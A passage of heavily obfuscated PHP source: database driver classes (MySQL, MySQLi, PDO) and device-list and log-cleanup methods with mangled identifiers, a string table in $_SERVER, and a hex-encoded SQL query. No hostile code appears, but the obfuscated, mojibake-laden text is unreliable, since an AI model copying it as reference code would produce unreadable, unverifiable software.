($–Š™èŠ‚[$òÈöìä·[33]] == $òÈöìä·[620]) { $–Š™èŠ‚[$òÈöìä·[526]][$òÈöìä·[1221]] = $»‚×›îæ[$–Š™èŠ‚[$òÈöìä·[526]][$òÈöìä·[1221]]]; $–Š™èŠ‚[$òÈöìä·[526]][$òÈöìä·[1222]] = $»‚×›îæ[$–Š™èŠ‚[$òÈöìä·[526]][$òÈöìä·[1222]]]; } if ($–Š™èŠ‚[$òÈöìä·[33]] == $òÈöìä·[2195]) { $–Š™èŠ‚[$òÈöìä·[526]][$òÈöìä·[193]] = $»‚×›îæ[$–Š™èŠ‚[$òÈöìä·[526]][$òÈöìä·[193]]]; } if ($–Š™èŠ‚[$òÈöìä·[33]] == $òÈöìä·[1919]) { $–Š™èŠ‚[$òÈöìä·[2200]] = $–Š™èŠ‚[$òÈöìä·[90]]; $–Š™èŠ‚[$òÈöìä·[2184]] = $–Š™èŠ‚[$òÈöìä·[2200]][$òÈöìä·[193]]; $–Š™èŠ‚[$òÈöìä·[90]] = !1; $–Š™èŠ‚[$òÈöìä·[193]] = $òÈöìä·[12]; } $ø¶ñß×à = array($òÈöìä·[1919], $òÈöìä·[2182]); if (!in_array($–Š™èŠ‚[$òÈöìä·[33]], $ø¶ñß×à)) { if ($–Š™èŠ‚[$òÈöìä·[90]] && $–Š™èŠ‚[$òÈöìä·[90]][$òÈöìä·[190]] == $òÈöìä·[191]) { $–ÂÉ„Êõ[] = $¦ó‚Ã…‘[$òÈöìä·[475]]; unset($°»ƒ€‘’[$ƒ³³æ‹Á]); continue; } if ($–Š™èŠ‚[$òÈöìä·[2200]] && $–Š™èŠ‚[$òÈöìä·[2200]][$òÈöìä·[190]] == $òÈöìä·[191]) { $–ÂÉ„Êõ[] = $¦ó‚Ã…‘[$òÈöìä·[475]]; unset($°»ƒ€‘’[$ƒ³³æ‹Á]); continue; } } } $¦ó‚Ã…‘[$òÈöìä·[526]] = $–Š™èŠ‚; unset($¦ó‚Ã…‘[$òÈöìä·[2413]]); $¿›åù’Ä[] = $¦ó‚Ã…‘; } $this->clearSystemPathLog($–ÂÉ„Êõ); return $¿›åù’Ä; } private function clearSystemPathLog($Ó…÷¨Êã) { $ï¨¥œÔ =& $_SERVER[‹è™Ü¸Ñ]; if (count($Ó…÷¨Êã) == 0) { return; } $à–ñ¿Ğ = array($ï¨¥œÔ[475] => array($ï¨¥œÔ[7], array_unique($Ó…÷¨Êã))); $this->where($à–ñ¿Ğ)->delete(); } public function deviceList($ƒŠ´øøî, $üÌÃøû = 0) { $„³Ñ½éŞ =& $_SERVER[‹è™Ü¸Ñ]; $Ë¼ÍĞ§ = array($„³Ñ½éŞ[1752] => $ƒŠ´øøî, $„³Ñ½éŞ[231] => array($„³Ñ½éŞ[1072], $üÌÃøû), $„³Ñ½éŞ[33] => $„³Ñ½éŞ[1893]); $¤œ¦Š÷È = array(); $ÃÌê¤° = $this->field($„³Ñ½éŞ[2414])->where($Ë¼ÍĞ§)->order($„³Ñ½éŞ[2198])->limit(50)->select(); foreach ($ÃÌê¤° as $Óæë¼Èé => $ˆî”ŸÆÈ) { if ($Óæë¼Èé > 0 && abs($ˆî”ŸÆÈ[$„³Ñ½éŞ[231]] - $ÃÌê¤°[$Óæë¼Èé - 1][$„³Ñ½éŞ[231]]) < 5) { continue; } $ÚÚ˜ô€© = json_decode($ˆî”ŸÆÈ[$„³Ñ½éŞ[526]], !0); $ˆî”ŸÆÈ[$„³Ñ½éŞ[2404]] = isset($ÚÚ˜ô€©[$„³Ñ½éŞ[2404]]) ? $ÚÚ˜ô€©[$„³Ñ½éŞ[2404]] : $„³Ñ½éŞ[12]; unset($ÚÚ˜ô€©[$„³Ñ½éŞ[2404]]); $“›àéß• = $this->deviceType($ÚÚ˜ô€©[$„³Ñ½éŞ[2187]]); if (isset($¤œ¦Š÷È[$“›àéß•])) { continue; } $ˆî”ŸÆÈ[$„³Ñ½éŞ[2408]] = IpLocation::get($ˆî”ŸÆÈ[$„³Ñ½éŞ[2404]]); $ˆî”ŸÆÈ[$„³Ñ½éŞ[526]] = $ÚÚ˜ô€©; $¤œ¦Š÷È[$“›àéß•] = $ˆî”ŸÆÈ; } return array_values($¤œ¦Š÷È); } public function deviceType($‘õúãçª) { return $‘õúãçª; } } goto FÜ´¯¥åé; dÏöêÎ–çÛ: class DbMysql extends Db { public function __construct($»ê„áÇ = '') { $”ø€Ó÷ =& $_SERVER[‹è™Ü¸Ñ]; if (!extension_loaded($”ø€Ó÷[859])) { think_exception(think_lang($”ø€Ó÷[14]) . $”ø€Ó÷[943]); } if (!empty($»ê„áÇ)) { $this->config = $»ê„áÇ; if (empty($this->config[$”ø€Ó÷[17]])) { $this->config[$”ø€Ó÷[17]] = $”ø€Ó÷[12]; } } } public function connect($–Äâ¾èÑ = '', $á¯‰ı– = 0, $®àîÕûø = false) { $ŸƒÇ‘¼ø =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($this->linkID[$á¯‰ı–])) { if (empty($–Äâ¾èÑ)) { $–Äâ¾èÑ = $this->config; } $ÜşË‰šÙ = $–Äâ¾èÑ[$ŸƒÇ‘¼ø[944]] . ($–Äâ¾èÑ[$ŸƒÇ‘¼ø[945]] ? "\72{$–Äâ¾èÑ[$ŸƒÇ‘¼ø[945]]}" : $ŸƒÇ‘¼ø[12]); $Êìø‘¹è = !empty($–Äâ¾èÑ[$ŸƒÇ‘¼ø[17]][$ŸƒÇ‘¼ø[18]]) ? $–Äâ¾èÑ[$ŸƒÇ‘¼ø[17]][$ŸƒÇ‘¼ø[18]] : $this->pconnect; if ($Êìø‘¹è) { $this->linkID[$á¯‰ı–] = mysql_pconnect($ÜşË‰šÙ, $–Äâ¾èÑ[$ŸƒÇ‘¼ø[946]], $–Äâ¾èÑ[$ŸƒÇ‘¼ø[947]], 131072); } else { $this->linkID[$á¯‰ı–] = mysql_connect($ÜşË‰šÙ, $–Äâ¾èÑ[$ŸƒÇ‘¼ø[946]], $–Äâ¾èÑ[$ŸƒÇ‘¼ø[947]], !0, 131072); } if (!$this->linkID[$á¯‰ı–] || !empty($–Äâ¾èÑ[$ŸƒÇ‘¼ø[21]]) && !mysql_select_db($–Äâ¾èÑ[$ŸƒÇ‘¼ø[21]], $this->linkID[$á¯‰ı–])) { think_exception(mysql_error()); } $¸½à€ã± = mysql_get_server_info($this->linkID[$á¯‰ı–]); mysql_query($ŸƒÇ‘¼ø[948] . think_config($ŸƒÇ‘¼ø[949]) . $ŸƒÇ‘¼ø[58], $this->linkID[$á¯‰ı–]); if ($¸½à€ã± > $ŸƒÇ‘¼ø[950]) { mysql_query($ŸƒÇ‘¼ø[951], $this->linkID[$á¯‰ı–]); } $this->connected = !0; if (1 != think_config($ŸƒÇ‘¼ø[22])) { unset($this->config); } } return $this->linkID[$á¯‰ı–]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ú§¡¦ÎÈ) { $¶è÷ñ×ê =& $_SERVER[‹è™Ü¸Ñ]; if (0 === stripos($ú§¡¦ÎÈ, $¶è÷ñ×ê[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ú§¡¦ÎÈ; if ($this->queryID) { $this->free(); } think_action_status($¶è÷ñ×ê[23], 1); think_status($¶è÷ñ×ê[24]); $this->queryID = mysql_query($ú§¡¦ÎÈ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ì¾ÃèôÒ) { $«–ßÕÀ¦ =& $_SERVER[‹è™Ü¸Ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ì¾ÃèôÒ; if ($this->queryID) { $this->free(); } think_action_status($«–ßÕÀ¦[25], 1); think_status($«–ßÕÀ¦[24]); $‰ËÀ² = mysql_query($ì¾ÃèôÒ, $this->_linkID); $this->debug(); if (!1 === $‰ËÀ²) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[‹è™Ü¸Ñ][952], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $éãçñŠ = mysql_query($_SERVER[‹è™Ü¸Ñ][953], $this->_linkID); $this->transTimes = 0; if (!$éãçñŠ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $…ßèõ£ = mysql_query($_SERVER[‹è™Ü¸Ñ][954], $this->_linkID); $this->transTimes = 0; if (!$…ßèõ£) { $this->error(); return !1; } } return !0; } private function getAll() { $éâ­ı±¯ = array(); if ($this->numRows > 0) { while ($×£…§š = mysql_fetch_assoc($this->queryID)) { $éâ­ı±¯[] = $×£…§š; } mysql_data_seek($this->queryID, 0); } return $éâ­ı±¯; } public function getFields($­ıŒ®¹) { $³š©£Ö£ =& $_SERVER[‹è™Ü¸Ñ]; $¶¥°ŒøÚ = $this->query($³š©£Ö£[955] . $this->parseKey($­ıŒ®¹)); $±ü€ü±’ = array(); if ($¶¥°ŒøÚ) { foreach ($¶¥°ŒøÚ as $¯Ğ…ÁÃ” => $×Ñæ½°Ÿ) { $±ü€ü±’[$×Ñæ½°Ÿ[$³š©£Ö£[31]]] = array($³š©£Ö£[32] => $×Ñæ½°Ÿ[$³š©£Ö£[31]], $³š©£Ö£[33] => $×Ñæ½°Ÿ[$³š©£Ö£[34]], $³š©£Ö£[35] => (bool) (strtoupper($×Ñæ½°Ÿ[$³š©£Ö£[36]]) === $³š©£Ö£[956]), $³š©£Ö£[37] => $×Ñæ½°Ÿ[$³š©£Ö£[38]], $³š©£Ö£[39] => strtolower($×Ñæ½°Ÿ[$³š©£Ö£[40]]) == $³š©£Ö£[41], $³š©£Ö£[42] => strtolower($×Ñæ½°Ÿ[$³š©£Ö£[43]]) == $³š©£Ö£[44]); } } return $±ü€ü±’; } public function getTables($èÀ­–ôƒ = '') { $íÂßÑşÃ =& $_SERVER[‹è™Ü¸Ñ]; if (!empty($èÀ­–ôƒ)) { $­é»æò = $íÂßÑşÃ[957] . $èÀ­–ôƒ . $íÂßÑşÃ[958]; } else { $­é»æò = $íÂßÑşÃ[959]; } $ØÓŒ°‚¯ = $this->query($­é»æò); $½ã±÷Æˆ = array(); foreach ($ØÓŒ°‚¯ as $„°´…µ´ => $ˆ¢šä²…) { $½ã±÷Æˆ[$„°´…µ´] = current($ˆ¢šä²…); } return $½ã±÷Æˆ; } public function replace($¶ïÈÂ‹¤, $Õïıœ”Ô = array()) { $™ËıİíÑ =& $_SERVER[‹è™Ü¸Ñ]; foreach ($¶ïÈÂ‹¤ as $ó®ÉËÆã => $Ü¼ò†Üí) { $Õš‹ÄÒ¿ = $this->parseValue($Ü¼ò†Üí); if (is_scalar($Õš‹ÄÒ¿)) { $‘ìƒÑ¢©[] = $Õš‹ÄÒ¿; $¹–çÉüğ[] = $this->parseKey($ó®ÉËÆã); } } $—†¦êŠ¡ = $™ËıİíÑ[960] . $this->parseTable($Õïıœ”Ô[$™ËıİíÑ[356]]) . $™ËıİíÑ[961] . implode($™ËıİíÑ[50], $¹–çÉüğ) . $™ËıİíÑ[962] . implode($™ËıİíÑ[50], $‘ìƒÑ¢©) . $™ËıİíÑ[963]; return $this->execute($—†¦êŠ¡); } public function insertAll($‘÷ü°õï, $áç“Õ‡ = array(), $ª¼â‹îû = false) { $‰÷âü =& $_SERVER[‹è™Ü¸Ñ]; if (!is_array($‘÷ü°õï[0])) { return !1; } $Œ€³æÓ = array_keys($‘÷ü°õï[0]); $¶²è“°Ø = array(); foreach ($‘÷ü°õï as $á³Ö¶µ) { $À°ƒåœ‡ = array(); foreach ($á³Ö¶µ as $›‘’® => $Ô…ôºçÖ) { $Ô…ôºçÖ = $this->parseValue($Ô…ôºçÖ); if (is_scalar($Ô…ôºçÖ)) { $À°ƒåœ‡[] = $Ô…ôºçÖ; } } $¶²è“°Ø[] = $‰÷âü[337] . implode($‰÷âü[50], $À°ƒåœ‡) . $‰÷âü[963]; } array_walk($Œ€³æÓ, array($this, $‰÷âü[964])); $ôüÍ Œ = ($ª¼â‹îû ? $‰÷âü[965] : $‰÷âü[966]) . $‰÷âü[967] . $this->parseTable($áç“Õ‡[$‰÷âü[356]]) . $‰÷âü[961] . implode($‰÷âü[50], $Œ€³æÓ) . $‰÷âü[968] . implode($‰÷âü[50], $¶²è“°Ø); return $this->execute($ôüÍ Œ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $¤ıâö£Î =& $_SERVER[‹è™Ü¸Ñ]; $this->error = mysql_errno() . $¤ıâö£Î[4] . mysql_error($this->_linkID); if ($¤ıâö£Î[12] != $this->queryStr) { $this->error .= LNG($¤ıâö£Î[48]) . $this->queryStr; } think_trace($this->error, $¤ıâö£Î[12], $¤ıâö£Î[49]); return $this->error; } public function escapeString($Ì´Ã„ó) { if ($this->_linkID) { return mysql_real_escape_string($Ì´Ã„ó, $this->_linkID); } else { return mysql_escape_string($Ì´Ã„ó); } } public function parseKey(&$ÍÉù¶¦š, $”ÉàñÁĞ = true) { $çËçï‡¢ =& $_SERVER[‹è™Ü¸Ñ]; if ($”ÉàñÁĞ) { $ÍÉù¶¦š = $this->parseKeyCheck($ÍÉù¶¦š); } if ($ÍÉù¶¦š != $çËçï‡¢[220] && !preg_match($çËçï‡¢[969], $ÍÉù¶¦š)) { $ÍÉù¶¦š = $çËçï‡¢[461] . trim($ÍÉù¶¦š, $çËçï‡¢[461]) . $çËçï‡¢[461]; } return $ÍÉù¶¦š; } } class DbMysqli extends Db { public function __construct($ùŠûÜ™ = '') { $ÏË»“¾¡ =& $_SERVER[‹è™Ü¸Ñ]; if (!extension_loaded($ÏË»“¾¡[970])) { think_exception(think_lang($ÏË»“¾¡[14]) . $ÏË»“¾¡[971]); } if (!empty($ùŠûÜ™)) { $this->config = $ùŠûÜ™; if (empty($this->config[$ÏË»“¾¡[17]])) { $this->config[$ÏË»“¾¡[17]] = $ÏË»“¾¡[12]; } } } public function connect($½ ğ¿Úì = '', $˜£¥„¢¢ = 0) { $ÁŸŒÁ¨Ì =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($this->linkID[$˜£¥„¢¢])) { if (empty($½ ğ¿Úì)) { $½ ğ¿Úì = $this->config; } $this->linkID[$˜£¥„¢¢] = new mysqli($½ ğ¿Úì[$ÁŸŒÁ¨Ì[944]], $½ ğ¿Úì[$ÁŸŒÁ¨Ì[946]], $½ ğ¿Úì[$ÁŸŒÁ¨Ì[947]], $½ ğ¿Úì[$ÁŸŒÁ¨Ì[21]], $½ ğ¿Úì[$ÁŸŒÁ¨Ì[945]] ? intval($½ ğ¿Úì[$ÁŸŒÁ¨Ì[945]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Ìâ±“Ô³ = $this->linkID[$˜£¥„¢¢]->server_version; $this->linkID[$˜£¥„¢¢]->query($ÁŸŒÁ¨Ì[948] . think_config($ÁŸŒÁ¨Ì[949]) . $ÁŸŒÁ¨Ì[58]); if ($Ìâ±“Ô³ > $ÁŸŒÁ¨Ì[950]) { $this->linkID[$˜£¥„¢¢]->query($ÁŸŒÁ¨Ì[951]); } $this->connected = !0; if (1 != think_config($ÁŸŒÁ¨Ì[22])) { unset($this->config); } } return $this->linkID[$˜£¥„¢¢]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($şšÄ å¦) { $¢‰µğıÎ =& $_SERVER[‹è™Ü¸Ñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $şšÄ å¦; if ($this->queryID) { $this->free(); } think_action_status($¢‰µğıÎ[23], 1); think_status($¢‰µğıÎ[24]); $this->queryID = $this->_linkID->query($şšÄ å¦); if ($this->_linkID->more_results()) { while (($Á™Ê‘º¢ = $this->_linkID->next_result()) != NULL) { $Á™Ê‘º¢->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ïşä©¥›) { $Æ§ŞÓ€• =& $_SERVER[‹è™Ü¸Ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ïşä©¥›; if ($this->queryID) { $this->free(); } think_action_status($Æ§ŞÓ€•[25], 1); think_status($Æ§ŞÓ€•[24]); $Ò öèôÌ = $this->_linkID->query($ïşä©¥›); $this->debug(); if (!1 === $Ò öèôÌ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $â¾¨ËÏ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$â¾¨ËÏ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $äßÎ¢ı‰ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$äßÎ¢ı‰) { $this->error(); return !1; } } return !0; } private function getAll() { $‚ÕˆÂõ = array(); if ($this->numRows > 0) { for ($‹µÎì = 0; $‹µÎì < $this->numRows; $‹µÎì++) { $‚ÕˆÂõ[$‹µÎì] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $‚ÕˆÂõ; } public function getFields($µäõ¨¡â) { $‡‰¼Ôç =& $_SERVER[‹è™Ü¸Ñ]; $¹€¨„ÙÙ = $this->query($‡‰¼Ôç[955] . $this->parseKey($µäõ¨¡â)); $ç÷ ÎïŒ = array(); if ($¹€¨„ÙÙ) { foreach ($¹€¨„ÙÙ as $°êé°™‰ => $‘›Æ×™„) { $ç÷ ÎïŒ[$‘›Æ×™„[$‡‰¼Ôç[31]]] = array($‡‰¼Ôç[32] => $‘›Æ×™„[$‡‰¼Ôç[31]], $‡‰¼Ôç[33] => $‘›Æ×™„[$‡‰¼Ôç[34]], $‡‰¼Ôç[35] => (bool) ($‘›Æ×™„[$‡‰¼Ôç[36]] === $‡‰¼Ôç[12]), $‡‰¼Ôç[37] => $‘›Æ×™„[$‡‰¼Ôç[38]], $‡‰¼Ôç[39] => strtolower($‘›Æ×™„[$‡‰¼Ôç[40]]) == $‡‰¼Ôç[41], $‡‰¼Ôç[42] => strtolower($‘›Æ×™„[$‡‰¼Ôç[43]]) == $‡‰¼Ôç[44]); } } return $ç÷ ÎïŒ; } public function getTables($àçØØÅè = '') { $Œ”æ‰Ô =& $_SERVER[‹è™Ü¸Ñ]; $úãİı¡œ = !empty($àçØØÅè) ? $Œ”æ‰Ô[957] . $àçØØÅè . $Œ”æ‰Ô[958] : $Œ”æ‰Ô[959]; $·ÃÍî®í = $this->query($úãİı¡œ); $ºœû°Í° = array(); if ($·ÃÍî®í) { foreach ($·ÃÍî®í as $ŒÒ¿ô™ => $İ•İäŞé) { $ºœû°Í°[$ŒÒ¿ô™] = current($İ•İäŞé); } } return $ºœû°Í°; } public function replace($ÑãŒŸõ…, $óÇ´¶Ÿú = array()) { $×‰Ùõ¨¢ =& $_SERVER[‹è™Ü¸Ñ]; foreach ($ÑãŒŸõ… as $óÁ‚­”ü => $Àú²‘Ê·) { $ãâØİ“ı = $this->parseValue($Àú²‘Ê·); if (is_scalar($ãâØİ“ı)) { $·„ºóÒ»[] = $ãâØİ“ı; $Ì¯…ğÈÎ[] = $this->parseKey($óÁ‚­”ü); } } $Òí„ñÒ  = $×‰Ùõ¨¢[960] . $this->parseTable($óÇ´¶Ÿú[$×‰Ùõ¨¢[356]]) . $×‰Ùõ¨¢[961] . implode($×‰Ùõ¨¢[50], $Ì¯…ğÈÎ) . $×‰Ùõ¨¢[962] . implode($×‰Ùõ¨¢[50], $·„ºóÒ») . $×‰Ùõ¨¢[963]; return $this->execute($Òí„ñÒ ); } public function insertAll($ó¼­Ä“’, $™àéÍ¦„ = array(), $İïüÁ‚ = false) { $•ÈœÌí© =& $_SERVER[‹è™Ü¸Ñ]; if (!is_array($ó¼­Ä“’[0])) { return !1; } $ÈÏ‹•Ë = array_keys($ó¼­Ä“’[0]); $’Ğ¨û§© = array(); foreach ($ó¼­Ä“’ as $Æ è³—„) { $µÀ¶ïıµ = array(); foreach ($Æ è³—„ as $ÏŠò‘€‰ => $¬…Ì¹¦â) { $¬…Ì¹¦â = $this->parseValue($¬…Ì¹¦â); if (is_scalar($¬…Ì¹¦â)) { $µÀ¶ïıµ[] = $¬…Ì¹¦â; } } $’Ğ¨û§©[] = $•ÈœÌí©[337] . implode($•ÈœÌí©[50], $µÀ¶ïıµ) . $•ÈœÌí©[963]; } array_walk($ÈÏ‹•Ë, array($this, $•ÈœÌí©[964])); $¥˜˜ÌÂ› = $İïüÁ‚ ? $•ÈœÌí©[965] : $•ÈœÌí©[966]; $ºÄ³ù…¸ = $¥˜˜ÌÂ› . $•ÈœÌí©[967] . $this->parseTable($™àéÍ¦„[$•ÈœÌí©[356]]) . $•ÈœÌí©[961] . implode($•ÈœÌí©[50], $ÈÏ‹•Ë) . $•ÈœÌí©[968] . implode($•ÈœÌí©[50], $’Ğ¨û§©); return $this->execute($ºÄ³ù…¸); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $êç§œü =& $_SERVER[‹è™Ü¸Ñ]; $this->error = $this->_linkID->errno . $êç§œü[4] . $this->_linkID->error; if ($êç§œü[12] != $this->queryStr) { $this->error .= LNG($êç§œü[48]) . $this->queryStr; } think_trace($this->error, $êç§œü[12], $êç§œü[49]); return $this->error; } public function escapeString($ö©¢ı¾Í) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ö©¢ı¾Í); } else { return addslashes($ö©¢ı¾Í); } } public function parseKey(&$µÃ÷Ì¾, $è‡«ø³§ = true) { $ıŠË‰÷¨ =& $_SERVER[‹è™Ü¸Ñ]; if ($è‡«ø³§) { $µÃ÷Ì¾ = $this->parseKeyCheck($µÃ÷Ì¾); } if ($µÃ÷Ì¾ != $ıŠË‰÷¨[220] && !preg_match($ıŠË‰÷¨[969], $µÃ÷Ì¾)) { $µÃ÷Ì¾ = $ıŠË‰÷¨[461] . trim($µÃ÷Ì¾, $ıŠË‰÷¨[461]) . $ıŠË‰÷¨[461]; } return $µÃ÷Ì¾; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($çóï™Á™ = '') { $øØ‡Ç¢³ =& $_SERVER[‹è™Ü¸Ñ]; if (!class_exists($øØ‡Ç¢³[972])) { think_exception(think_lang($øØ‡Ç¢³[14]) . $øØ‡Ç¢³[973]); } if (!empty($çóï™Á™)) { $this->config = $çóï™Á™; if (empty($this->config[$øØ‡Ç¢³[17]])) { $this->config[$øØ‡Ç¢³[17]] = array(); } } } public function connect($Ê¬ãÖ¹ = '', $ç«ò©ƒÖ = 0) { $öĞ´Óã¢ =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($this->linkID[$ç«ò©ƒÖ])) { if (empty($Ê¬ãÖ¹)) { $Ê¬ãÖ¹ = $this->config; } $‡¢µÁöã = !empty($Ê¬ãÖ¹[$öĞ´Óã¢[17]][$öĞ´Óã¢[18]]) ? $Ê¬ãÖ¹[$öĞ´Óã¢[17]][$öĞ´Óã¢[18]] : $this->pconnect; if ($‡¢µÁöã) { $Ê¬ãÖ¹[$öĞ´Óã¢[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ç«ò©ƒÖ] = new PDO($Ê¬ãÖ¹[$öĞ´Óã¢[974]], $Ê¬ãÖ¹[$öĞ´Óã¢[946]], $Ê¬ãÖ¹[$öĞ´Óã¢[947]], $Ê¬ãÖ¹[$öĞ´Óã¢[17]]); } catch (PDOException $îı†õí) { think_exception($îı†õí->getMessage()); } $this->dbType = $this->_getDsnType($Ê¬ãÖ¹[$öĞ´Óã¢[974]]); if (in_array($this->dbType, array($öĞ´Óã¢[975], $öĞ´Óã¢[976], $öĞ´Óã¢[977], $öĞ´Óã¢[978]))) { think_exception($öĞ´Óã¢[979] . $this->dbType . $öĞ´Óã¢[980] . $this->dbType . $öĞ´Óã¢[981]); } if (!$this->linkID[$ç«ò©ƒÖ]) { think_exception($öĞ´Óã¢[982]); } try { $this->linkID[$ç«ò©ƒÖ]->exec($öĞ´Óã¢[983] . think_config($öĞ´Óã¢[949])); } catch (Exception $îı†õí) { } $this->connected = !0; if (1 != think_config($öĞ´Óã¢[22])) { unset($this->config); } } return $this->linkID[$ç«ò©ƒÖ]; } public function free() { $this->PDOStatement = null; } public function query($èô¥›õ¢, $¬›ğ×Ù• = array()) { $´š¢¯Ğµ =& $_SERVER[‹è™Ü¸Ñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $èô¥›õ¢; if (!empty($¬›ğ×Ù•)) { $this->queryStr .= $´š¢¯Ğµ[984] . print_r($¬›ğ×Ù•, !0) . $´š¢¯Ğµ[985]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($´š¢¯Ğµ[23], 1); think_status($´š¢¯Ğµ[24]); $this->PDOStatement = $this->_linkID->prepare($èô¥›õ¢); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÅÛÄíù˜ = $this->PDOStatement->execute($¬›ğ×Ù•); $this->debug(); if (!1 === $ÅÛÄíù˜) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($—ßú’ÜÉ, $É§ğí³ı = array()) { $ ”õˆòÓ =& $_SERVER[‹è™Ü¸Ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $—ßú’ÜÉ; if (!empty($É§ğí³ı)) { $this->queryStr .= $ ”õˆòÓ[984] . print_r($É§ğí³ı, !0) . $ ”õˆòÓ[985]; } $¾–ø°‰Ö = !1; if ($this->dbType == $ ”õˆòÓ[978]) { if (preg_match($ ”õˆòÓ[986], $this->queryStr, $üšŒ®¡Á)) { $this->table = think_config($ ”õˆòÓ[987]) . str_ireplace(think_config($ ”õˆòÓ[988]), $ ”õˆòÓ[454], $üšŒ®¡Á[2]); $¾–ø°‰Ö = (bool) $this->query($ ”õˆòÓ[989] . strtoupper($this->table) . $ ”õˆòÓ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ ”õˆòÓ[25], 1); think_status($ ”õˆòÓ[24]); $this->PDOStatement = $this->_linkID->prepare($—ßú’ÜÉ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Õú¤ã = $this->PDOStatement->execute($É§ğí³ı); $this->debug(); if (!1 === $Õú¤ã) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¾–ø°‰Ö || preg_match($ ”õˆòÓ[990], $—ßú’ÜÉ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ŠòÍŸ‚· = $this->_linkID->commit(); $this->transTimes = 0; if (!$ŠòÍŸ‚·) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÊßÅ¾Ë¦ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÊßÅ¾Ë¦) { $this->error(); return !1; } } return !0; } private function getAll() { $‰ìº–óñ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($‰ìº–óñ); return $‰ìº–óñ; } public function getFields($‚¤‘¬±å) { $ª­‘˜Ã¡ =& $_SERVER[‹è™Ü¸Ñ]; $this->initConnect(!0); if (think_config($ª­‘˜Ã¡[991])) { $Œ¸°™Şà = str_replace($ª­‘˜Ã¡[992], $‚¤‘¬±å, think_config($ª­‘˜Ã¡[991])); } else { switch ($this->dbType) { case $ª­‘˜Ã¡[975]: case $ª­‘˜Ã¡[993]: $Œ¸°™Şà = "\123\105\114\x45\103\x54\x20\40\x20\x63\157\154\x75\x6d\156\x5f\x6e\141\155\x65\40\x61\x73\x20\x27\x4e\141\x6d\145\47\54\x20\x20\40\x64\141\164\x61\137\164\x79\160\x65\x20\141\163\40\47\x54\171\x70\145\47\54\40\x20\x20\143\x6f\154\165\155\156\137\x64\145\x66\x61\165\x6c\x74\x20\141\163\x20\x27\104\145\146\x61\165\x6c\164\47\x2c\40\40\40\x69\x73\x5f\x6e\165\x6c\x6c\141\x62\x6c\145\x20\141\163\40\47\116\x75\x6c\x6c\47\12\11\x9\x46\x52\x4f\115\11\151\x6e\x66\157\x72\x6d\x61\x74\x69\x6f\156\137\x73\143\150\145\x6d\141\x2e\164\x61\x62\154\145\163\x20\x41\123\x20\x74\xa\x9\11\112\x4f\111\x4e\11\x69\x6e\146\157\x72\155\141\164\151\x6f\156\x5f\x73\x63\150\x65\x6d\x61\x2e\x63\157\154\165\x6d\x6e\x73\40\101\123\40\143\12\x9\11\117\x4e\x20\40\164\x2e\164\x61\x62\154\x65\137\x63\141\x74\x61\154\x6f\147\x20\x3d\40\x63\x2e\164\x61\x62\154\x65\x5f\x63\141\x74\141\x6c\x6f\147\12\11\x9\101\x4e\x44\40\x74\x2e\x74\141\142\x6c\x65\x5f\x73\x63\150\145\155\141\x20\75\40\x63\56\164\x61\x62\x6c\145\x5f\x73\143\150\x65\155\141\xa\x9\11\101\x4e\x44\40\x74\56\164\x61\142\154\x65\x5f\156\141\x6d\145\x20\75\x20\x63\56\164\141\x62\154\x65\x5f\x6e\141\x6d\145\12\x9\x9\127\110\105\x52\105\40\40\40\164\x2